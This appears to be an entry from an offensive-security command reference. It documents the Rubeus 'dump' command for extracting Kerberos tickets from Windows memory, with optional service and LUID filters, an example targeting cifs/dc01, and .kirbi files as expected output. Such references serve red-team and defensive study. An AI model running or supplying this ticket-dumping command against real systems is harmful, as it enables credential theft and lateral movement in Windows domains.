---
type: command
executor: powershell
data: 'Rubeus.exe dump [/service:$_SERVICE] [/luid:$_LUID]'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - kerberos
  - ticket-dumping
verified: true
validated: true
---

# rubeus-dump-ticket

## Command

```powershell
Rubeus.exe dump [/service:$_SERVICE] [/luid:$_LUID]
```

## Description

Dumps Kerberos tickets from memory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [/service:$_SERVICE] | Specific service | No |
| [/luid:$_LUID] | Session LUID | No |

## Examples

### Basic Usage

```powershell
Rubeus.exe dump /service:cifs/dc01
```

## Expected Output

Exported .kirbi files with ticket data.

## Related

- [[tools/Rubeus]]
